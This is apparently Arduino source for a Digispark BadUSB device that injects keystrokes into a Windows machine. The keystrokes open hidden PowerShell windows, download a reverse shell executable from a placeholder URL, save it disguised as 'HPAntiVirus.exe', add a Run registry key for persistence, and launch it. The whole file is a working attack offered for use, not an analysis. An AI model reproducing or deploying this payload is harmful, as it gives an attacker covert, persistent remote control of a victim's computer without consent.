// Product: Persistent Reverse shell script
// Description: Script that downloads a reverse shell executable, adds it to the registry startup directory and then executes
// Author: Benjamin Norman 2022 [Github: https://github.com/BenjaminN117]

void setup() {
  // put your setup code here, to run once:
   pinMode(1, OUTPUT);
}

void loop() {
  
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0); 
  // Get the reverses shell script
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  // Downloads the reverse shell and sets the name as HPAntiVirus.exe

  // Store the file in the AppData folder for the currently active user profile
  DigiKeyboard.print("PowerShell.exe -windowstyle hidden {wget https://REVERSE_SHELL_URL -outfile \"%USERPROFILE%\\AppData\\Local\\Microsoft\\HPAntiVirus.exe\"}");

  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);

  // Set the reverese shell to be persistent
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);

  // Sets the Registry entry name to HPAntiVirus
  DigiKeyboard.print("PowerShell.exe -windowstyle hidden {New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name HPAntiVirus -PropertyType String -Value %USERPROFILE%\\AppData\\Local\\Microsoft\\HPAntiVirus.exe\}");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);


  // Execute the reverse shell
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);

  DigiKeyboard.print("PowerShell.exe -windowstyle hidden {Start-Process -FilePath "%USERPROFILE%\\AppData\\Local\\Microsoft\\HPAntiVirus.exe"}");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);






}
